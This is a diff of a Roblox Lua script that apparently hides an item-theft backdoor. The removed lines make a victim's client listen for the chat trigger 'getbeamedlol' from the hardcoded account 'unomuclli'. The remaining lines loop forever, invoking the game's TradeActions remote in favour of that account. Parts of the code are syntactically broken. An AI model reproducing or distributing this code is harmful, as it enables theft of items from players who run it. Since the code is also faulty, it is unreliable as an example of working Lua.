@@ -1,11 +1,3 @@
-local Admin = "unomuclli"
-
-
-if game.Players.LocalPlayer.Name ~= Admin then
-function test()
-game.Players[Admin].Chatted:Conenct(function(msg)
-if msg == "getbeamedlol"
-spawn(function()
 while wait() do
 local Admin = "unomuclli"
 local args = {
@@ -13,21 +5,4 @@ local args = {
     [2] = Admin
 }
 game:GetService("ReplicatedStorage").Events.TradeActions:InvokeServer(unpack(args))
-end
-end)
-end
-end)
-end
-
-for i, v in pairs(game.Players:GetChildren()) do
-if v.Name == Admin then
-test()
-end
-end
-
-game.Players.PlayersAdded:Connect(function(v)
-if v.Name == Admin then
-test()
-end
-end)
 end
